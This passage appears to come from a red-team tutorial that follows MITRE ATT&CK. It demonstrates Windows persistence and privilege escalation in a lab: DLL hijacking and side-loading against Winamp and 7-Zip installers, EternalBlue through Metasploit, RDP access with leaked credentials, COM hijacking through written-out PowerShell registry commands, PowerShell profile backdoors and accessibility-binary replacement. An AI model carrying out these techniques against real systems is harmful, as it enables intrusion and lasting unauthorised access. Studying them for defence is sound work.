Ok so now I will add our malicious payload which in this case it's calc.exe replacing net.exe.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYgM6F9qjB4XMGX5z%2Fimage.png?alt=media&token=97ff9d5f-95c1-4d74-af90-a26dcf208de5)

We add our new path and make sure this is before C:\Windows\System32.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYhF7UTBGrrbNkR5m%2Fimage.png?alt=media&token=282db0ed-c1f0-4c6a-a228-0e077c85458b)

Perfect, now I will run net.exe regularly and Calc should prompt instead.

### executable-installer-file-permissions-weakness

Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under higher-level permissions, which could include SYSTEM.

Another variation if this technique can be performed by takin advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the         %TEMP%  directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of DLL Search Order Hijacking.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to Bypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

**Example**

In this example I will demonstrate a simple install 7z1512.exe I will run Procmon in this situation and see what is going on when my Installer is executed.

I noticed that 7z Installer is looking for a DLL named TextShaping.dll and it is looking for it in the current working directory.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXtIXC130hr_C_TbA%2Fimage.png?alt=media&token=c608695a-d6e6-47d4-8b52-00f598187c56)

I will take the same approach as previous DLL examples and try to add this DLL with the proper architecture of the program which in this case is 32-bit

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXuLJSJjGHuAKS4QM%2Fimage.png?alt=media&token=b5344609-e9fa-47f1-a7e6-4feaa524e116)

We run the installer again but this time we are placing our payload named properly as the DLL that the installer is trying to load, in this case TextShaping

This time no more TextShaping location issues:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXv1hEd4xC3Nl5wRr%2Fimage.png?alt=media&token=36b619ff-23f0-42d0-9b91-6c31a7fce911)

And we receive a shell on our attacking machine.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhXvkw4X-RRFeSoGXt%2Fimage.png?alt=media&token=73f9bfd8-8c12-418c-b639-da630f6190d1)

Here I received Administrator Privileges on the machine as only Admins can install new software but of course there are many scenarios where we can actually gain user permissions if the user has specific permissions to install now programs on that machine as well. Remember that proper execution of the installer is not functional anymore and will seem suspicious that we can't install a program. We can take an approach of a Proxy DLL but that is something for another time, I demonstrate that technique in DLL Side Loading

### dll-side-loading

Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs.

Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with malicious one, causing the operating system to load their malicious library when it is called for by the victim program.

Program may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.

Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.

Windows, like many operating systems, allows applications to load DLLs at runtime. Applications can specify the location of DLLs to load by specifying the location of DLLs to load by specifying a full path, using DLL redirection, or by using a manifest. If none of these methods are used, Windows attempts to locate the DLL by searching a predefined set of directories in a set of order.

Example:

I will work on the Winamp Program again, this time I won't be replacing any DLL files to load my payload but here I will be tricking the Program into load my DLL payload, usually to achieve this we would need a .manifest file to be modified and to point to our payload but here we will modify a legit DLL and add a "proxy DLL" to execute our payload and send the legitimate calls to the legit DLL as well. So here execution wouldn't even fail!

First we will search for a proper DLL, according to the hints the smaller the better. I will use Procmon again as well and search for a proper file that has a SUCCESS Result.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPCyZDqqN6DA2fjlF%2Fimage.png?alt=media&token=763d5683-eb28-4b6c-affc-fe09987ef66a)

My victim is the nsutil.dll, usually we want to target files that have user-land access but in these situations most likely you will encounter a situation where Administrator Privileges are required.

Will grab nsutil and place it on the same folder as our payload.dll file and have a work from this awesome tool DLLSideLoader.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPDm2BN3MdJZwW3fo%2Fimage.png?alt=media&token=6df11685-acca-4928-a4c7-0f2b47dedf42)

Will Import the PS1 Script onto our PowerShell Session and run the following syntax, if everything runs correctly you should see something like this:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPEoGFek8VXwys9Xy%2Fimage.png?alt=media&token=0a8afb1b-14d6-41e7-ad2f-b122570543dc)

Something I had troubles when using this method is I wasn't paying attention to the architecture of the software, I was mainly building my payload for a 64 Bit PC as this was my targeted machine, but in this situation we are targeting the program not the OS.

Will grab all of these files (payloadx86.dll, nsutil.dll and tmp2D86.dll and replace them where our legitimate program is located.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPFe3NeZXCvxqp7pB%2Fimage.png?alt=media&token=058f7b15-1674-43ce-895d-658c86452dc3)

Once winamp is executed the nsutil will call tmp and proxy the execution onto our payloadx86 and move back to the legitimate calls so our program won't crash but we will also receive our reverse shell. 

**(This is a Hit or Miss I managed to get it working sometimes and sometimes it wouldn't even open but will always receive a shell no matter the location of the binary as long as they were in the same location with the files)**

Or we can also execute without having all of this replaced they can run in the same folder as long as these files are all together (remember dll hijacking the order it follows)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPGVTR6b6XxSuVIED%2Fimage.png?alt=media&token=34d6444a-0ee4-42aa-aa5d-d9f98bc28ac7)

The same result for both situations.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPJxs6d61Hz4UcHGn%2Fimage.png?alt=media&token=b8027206-a7a7-4032-867d-4b314730e5ef)

##################################################################################################

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhPIgRNZCCMbu6diuB%2Fimage.png?alt=media&token=95ede75a-9be1-40c6-a46f-2fd2ffc35064)

References:

DLL Side-loading Appverif.exe

Fat Rodzianko

Sideloading DLL like APT1337

​

### dll-search-order-hijacking

Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program, Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.

There are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.

Adversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL.

If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.

Let us see some examples:

In Windows Environments when an application or a service is starting it looks for a number of DLL's in order to function properly. If these DLL's doesn't exist or are implemented in an insecure way (DLL's are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL File.

It should be noted that when an application needs to load a DLL it will go through the following order:

·         The directory which the application is loaded.

·         C:\Windows\System32

·         C:\Windows\System

·         C:\Windows

·         The current working directory

·         Directories in the system PATH environment variable

·         Directories in the user PATH environment variable

A fast way to Hijack and Find any DLL Hijacking is using PowerSploits, Find-PathDLLHijack, Find-ProcessDLLHijack, Invoke-AllChecks. We can check that powersploit will tell us where the hijack is located and what command to use next to hijack the process immediately.

We will work with Administrator Privileges in this example, not completely necessary if you can find a user with misconfiguration permission where they are allowed to WRITE, crazy right!!?, who would do that!!?

**Procmon**

For this technique I will use Procmon, as this is a great toll to view what a program is loading at run time, there are also other great tools from PowerSploit that will verify this Vulnerability, other tools such as SharpUp from GhostPack it is a tool written in C#.

Our Process in this sample is Winamp.

Winamp is a media player for Microsoft Windows it was a very popular and widely used media player back in the early 2000's, in the version we are currently working on it contains a DLL Hijack vulnerability as it is trying to load many different DLL files inexistent in its current directory, we can verify this with Procmon.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhOx_LcpwKDXFX9kij%2Fimage.png?alt=media&token=e03ccba8-2142-46e0-bedb-12f07bbb4138)

Wow, many potential hijacks, so our next step is to choose a DLL we wish to hijack, I will use the DLL . I will use a DLL this time to receive a reverse shell. My focus will be on vcruntime140d.dll

What happens when the program cannot find the DLL, it start following an order to locate the DLL

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhOyxBy-dbQi0p9O-0%2Fimage.png?alt=media&token=c506d436-f671-4f8f-93a3-c9996fb8f2e9)

Let us take a look and see what happens if I rename it, how will the order continue.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhOzx0oN5aaCokeBAT%2Fimage.png?alt=media&token=a8e9a440-464b-4955-a0c8-2b6e3fde534f)

Now I will add this DLL to any of the other paths that are seen above see if it loads it and gives me a shell.

Once added:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhP-wb38i6CkvFoAKx%2Fimage.png?alt=media&token=495e2e46-fff8-4832-9a1e-135d0a4fa8cd)

We can simply start the process and check the results

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhP1LQ1ocbxd9bW3pF%2Fimage.png?alt=media&token=718c142b-ab18-4818-ad58-b0f9f61ede90)

And this time it did find it.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhP3HN1xpXhElGqYbl%2Fimage.png?alt=media&token=499d23bc-f79b-42db-85cd-4936ae059540)

References:

Automating DLL Hijack Discovery

Medium

​

Windows DLL Hijacking (Hopefully) Clarified | itm4n's blog

## t1133-external-remote-services

Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management can also be used externally.

Access to 

[Valid Accounts](https://attack.mitre.org/techniques/T1078)

 to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credential from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.

### smb-windows-admin-shares

Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares.

Windows systems have hidden network shares that are accessible only to Administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMINS$ and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB, to interact with systems using remote procedure calls (RPCs), transfer files, and run transferred binaries through remote Execution.

Boy is this one a famous one (WannaCry), this port now uncommon but not dead is still facing the public internet (do your recon if you don't believe me). This port is another common service offered by operating systems, it allows us to share files across the network with ease, but it also allows attackers to gain access to machines and even move laterally through the network!!(More on that later).

**Recon**

We start with our nmap scan to find the service running on the Operating System we are aware that the service runs on port 445 so we will focus on this one on our initial enumeration.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhObmIULT58EljPfYI%2Fimage.png?alt=media&token=d2307cca-a168-4455-90cd-1c195648686f)

We see our port and service open and running with some enumeration we can find that this service is vulnerable to Eternalblue Exploit. This was a very known vulnerability leaked by Shadow Brokers in 2017 and developed by the NSA. It has been properly tested and developed on the Metasploit Framework (please do try and manually exploit this as there are many around flying on github). We will use this to gain a shell and access on to the machine.

But!!, let's be honest even though we are having and simulating an APT let's be CAREFUL when using these exploits as they are well known to crash servers, YES, YES they have been tested and properly configured to work on the framework but computers are so random that you don't even know if this will work, it is always best and of good practice to replicate the environment in a Virtual Machine and TEST your exploits THERE!!.

We verify our variables that are set onto Metasploit and execute the Exploit and we get a Shell.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhOd4_5_bDJgLxL-9a%2Fimage.png?alt=media&token=08a3c38b-212c-45f8-8611-3e969a0ed21c)

And it's SYSTEM Access. This was another great example of Services facing the public internet and how attackers can leverage this vulnerabilities and gain access to the network. With some proper enumeration and the correct tools we can find these vulnerabilities on the targeted machine and be able to gain access to the PC.

Remember even though this was a very dangerous vulnerability and it's not seen in the wild anymore, well not as often it is unfortunately still out there.

### rdp-service

Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS)

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.

Sometimes we need to access our PC from a remote location due to situations that are out of our control, but Windows made it simple to allow RDP Connections to our PC through the RDP Service. (Pro to Enable, Home only allows Connection). And we will initiate our RDP Service to point a Public IP Address so that we can Access our Internet Network from a remote location.

Here in a work perspective is great in an Attacker perspective this is even greater, the only thing that stops them is too find any Valid Accounts that can give them access to the service. There are some public exploits but have a few requirements for them to be successful. Some need to run a specific service (UltraVNC, TightVNC, etc.) Other need older OS (Windows XP, Vista, 7).

**Recon**

Let us start with a simple nmap scan these services run on specific ports(unless changed) RDP is known for running on port 3389 we will focus our scan on this specific port and see what information we can grab from this port.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhOPjwa9gU3zmfiLZ-%2Fimage.png?alt=media&token=5305a685-4791-4df4-bd05-d5b30f6b820b)

We continue by searching for accounts or common passwords that can give us some access to this services, in this step we can use many techniques such as OSINT, Phishing, Leaked Databases, etc. These will be helpful to find users or credentials for trying out on the External Remote Services available from a company that is facing the public internet.

**Exploitation**

Well on this attack we won't be using any exploits but this attack consists mostly on having some Valid Accounts with RDP Permissions or Administrator Account Privileges, these accounts are usually the ones capable of remote access through RDP.

But in this example we did our recon and found some old credentials leaked in a previous Database.

User: John

Password: P4$W0rd123

!

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhOHdRj4MUAcWObfTA%2F-MRhORk8lBYC_wI8fWMV%2Fimage.png?alt=media&token=5e5c3517-f1c5-4a55-9efd-239735d85eaf)

And finally after some hard work we manage to get Access through our RDP Service that we found in our Initial Recon, this is another great example not common but still out there, that can give attackers access to the internal network.

## t1546-event-triggered-execution

Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor user activity such as running specific applications/binaries.

Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.

Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.

### component-object-model-hijacking

Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system. References to various COM objects are stored in the Registry.

Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operations the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.

**Example:**

For this example I will search for instances of applications trying to load objects that don't exist.

Process Monitor is a great tool to search for these objects it's part of the Sysinternals Suite and it shows everything in real time. When running procmon we will apply a filter since it gets bloated with a ton of information that in this case won't be necessary, so what we are looking for here is:

·         Result is NAME NOT FOUND

·         Operations is RegOpenKey

·         Path ends with InprocServer32

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhNpXc1Hvxd1uuObdO%2F-MRhNyd9cOWq7N4c_Trs%2Fimage.png?alt=media&token=9d6ac4c2-94a2-4085-b075-3ccafedef256)

In a few minutes I get a ton of results, since this is a Clean VM almost everything is from Explorer and Firefox mainly:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhNpXc1Hvxd1uuObdO%2F-MRhNznXSX8cGYjgmZMK%2Fimage.png?alt=media&token=518876c7-806a-4537-b728-688b37e257ec)

One of the things I noticed is probably the times it is being called, In my testing I went for Explorer since it is being called plenty of times in a matter of seconds but It usually failed, I have no idea why, (Please do explain if you know @dmcxblue).

From here create a Simple DLL Project from Visual Studio and have it open a MessageBox, I wrote "Hello hacker", it will need 3 arguments so just use NULL on the other 2 and your last being Hello hacker message.

Once we have our DLL built we will transfer it to the host machine and register it to the proper CLSID but we are assuming here that we have a terminal and not a GUI Desktop so for this simple demo we will.

We will locate the CLSID that we are currently aiming to Hijack and we will change the location of the DLL that it is currently trying to load:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhNpXc1Hvxd1uuObdO%2F-MRhO06H9Ews45rOVSrz%2Fimage.png?alt=media&token=34807911-f379-471e-ad82-c132bfc201ef)

Once we find ti and replace this, we will wait for a while (10 min in my occasion) and we will get greeted with a message (we are trying to gain persistence as an Administrator, but in this Demo I reached for a user level persistence)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhNpXc1Hvxd1uuObdO%2F-MRhO199FItEHAG-ew8r%2Fimage.png?alt=media&token=66686979-cf55-49da-9c60-10f7fbbf15fd)

Tip:  We can also use Powershell

New-Item -Path "HKU:\S-1-5-21-214746808-1661000321-346206657-1108_Classes\Wow6432Node\CLSID\" -Name "{F1C46D71-B791-4110-8D5C-7108F22C1010}"

New-Item -Path "HKU:\S-1-5-21-214746808-1661000321-346206657-1108_Classes\Wow6432Node\CLSID\{F1C46D71-B791-4110-8D5C-7108F22C1010}" -Name "InprocServer32" -Value "C:\Temp\HelloHacker.dll"

New-ItemProperty -Path "HKU:\S-1-5-21-214746808-1661000321-346206657-1108_Classes\Wow6432Node\CLSID\{F1C46D71-B791-4110-8D5C-7108F22C1010}\InprocServer32" -Name "ThreadingModel" -Value "Both"

References:

Abusing the COM Registry Structure: CLSID, LocalServer32, & InprocServer32

bohops

​

Abusing DCOM For Yet Another Lateral Movement Technique

### powershell-profile

Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile (profile.ps1) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.

PowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.

Adversaries may modify these profiles to include arbitrary commands, functions, modules and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell sessions the modified script will be executed unless the -NoProfile flag is used when it is launched.

An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.

Example:

PowerShell Profile is a PowerShell script which you can customize to your environment and add session specific elements to every PowerShell session that you Start.

It's a script that runs when PowerShell starts. You can use profiles as a logon script to customize the environment. You can add Commands, Functions, Aliases, Modules, etc.

PowerShell supports several profile files. Also, PowerShell host programs can support their own host-specific profiles.

A few Samples:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhNBtWNjl_tPuP4LTc%2Fimage.png?alt=media&token=f34afe3b-0abf-4cf3-99b7-17fbce2c8128)

The PowerShell profile script is stored in the folder 

**“WindowsPowerShel”**

 which is by default is hidden from the user. If a payload has been dropped into disk the “

**Start-Process**

” cmdlet can be used to point to the location of the Executable. The “Test-Path” determines if a profile exists for the current user. If the profile doesn’t exist the Command “

**New-Item -Path $Profile -Type File -Force**

” will create a profile for the current users and the “

**Out-File**

” will rewrite the profile.

First let’s create a Profile:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhNCu-bfKiwzqIcBaP%2Fimage.png?alt=media&token=acbee862-5686-4f92-b1a8-a8391ca47ec2)

Then I will add the command I want to be executed when a New PowerShell Session is initiated.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhNDm5hj9Lx6239mQ9%2Fimage.png?alt=media&token=ac686555-f685-4ab0-ab8c-97e3ffa81734)

Now every New PowerShell will run my Executable Command and connect back to my Attacking Machine.

Runs every Second

These are just a few demonstrations that I wanted to share they are simple and very easy to follow, If you would love to go more into Detail please do check out the MITRE Framework as it’s a great guide to understand and check out various techniques used by APT’s.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhNij9sC-MEm7aPcdY%2Fpersistence-penv.gif?alt=media&token=ef6065ad-2acd-4b58-8474-7c58fda38bf8)

### application-shimming

Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming features allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.

Within the framework, shims are created to act as a buffer between the program ( or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.

A list of all shims currently installed by the default Windows Installer (sdbinst.exe) is kept in:

·         %WINDIR%\AppPatch\sysmain.sdb and

·         hklm\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb

Custom databases are stored in:

·         %WINDIR%\AppPatch\custom & %WINDIR%\AppPatch\AppPatch64\Custom and

·         hklm\software\microsoft\windows nt\currentversion\appcompatflags\custom

To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to bypass User Account Control (UAC and RedirectEXE), injects DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).

Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. Shims can also be abused to establish persistence by continuously being invoked by affected programs.

### accessibility-features

Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

Two common accessibility programs are C:\Windows\System32\sethc.exe, launched when the shift key is pressed five times and C:\Windows\System32\utilman.exe, launched when the Windows + U key combination is pressed.

The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen.

Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in %systemdir%\, and it must be protected by Windows File or Resource Protection (WFP/WRP). The Image File Execution Option Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

For simple binary replacement on Windows XP and later as well as Windows Server 2003/R2 and later, for example, the program (e.g:C:\Windows\System32\utilman.exe) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges.

Other accessibility features exist that may also be leveraged in a similar fashion:

·         On-Screen Keyboard: C:\Windows\System32\osk.exe

·         Magnifier: C:\Windows\System32\Magnify.exe

·         Narrator: C:\Windows\System32\Narrator.exe

·         Display Switcher: C:\Windows\System32\DisplaySwitch.exe

·         App Switcher: C:\Windows\System32\AtBroker.exe

Example:

Note: Now in the newer Windows 10 some come with a Trusted Installer Group from the start, mostly on Enterprise Version it's a security feature not even SYSTEM has access the only approach I found was the takeover utility

We find the Accessibility Feature we are trying to abuse for our persistence in this sample OSK(On-Screen Keyboard)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhMtBcbsdIe1NAA1T_%2Fimage.png?alt=media&token=c4381dbe-e057-42a5-970b-037e4e9c8312)

We demonstrated where this Accessibility Feature is located we can also use more easier ones such as Utilman.exe this executable has a shortcut of Windows + U

What happens when we replace the binary with a cmd.exe binary and use the Shortcut?

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhMu26piYYTzDwP8g0%2Fimage.png?alt=media&token=47b70ed9-11dd-4910-ba8a-bdf572c05732)

Windows + U

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhLdzPhVwvvWhac6Li%2F-MRhMuzRWHrEk6Vk5CT3%2Fimage.png?alt=media&token=3d45ad17-8589-4823-b9fe-7c0cb2b5b470)

### netsh-helper-dll

Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.

Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if software (ex:VPN) is present on the system that executes netsh.exe as part of its normal functionality.

Example:

Netsh is a command-line scripting utility that allows you to display or modify the network configuration of a computer that is currently running. Net sh also provides scripting features that allows you to run a group of commands in batch mode against a specific computer.

Netsh interacts with other operating system components by using dynamic-link library (DLL) files. Each netsh helper DLL provides an extensive set of features. Netsh functionality can be extended with the use of DLL files.

We first create our dll payload and send it to the target workstation using the msfvenom command:

